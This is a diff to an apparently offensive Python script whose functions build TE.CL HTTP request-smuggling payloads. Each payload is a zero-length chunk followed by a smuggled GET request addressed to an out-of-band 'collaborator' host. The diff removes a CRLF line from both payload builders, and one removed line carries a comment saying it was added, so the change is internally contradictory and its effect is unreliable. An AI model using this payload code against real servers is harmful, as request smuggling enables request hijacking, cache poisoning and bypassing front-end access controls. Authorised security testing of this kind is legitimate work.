@@ -33,7 +33,6 @@ def te_cl_smuggling(url, collaborator_url, path):
     }
     body = (
         "0\r\n"
-        "\r\n"
         f"GET /{path} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
@@ -88,7 +87,6 @@ def te_cl_smuggling1(url, collaborator_url, path1):
     }
     body = (
         "0\r\n"
-        "\r\n" #Changed this to add \r\n
         f"GET /{path1} HTTP/1.1\r\n"
         f"Host: {collaborator_url}\r\n"
         "Connection: close\r\n"
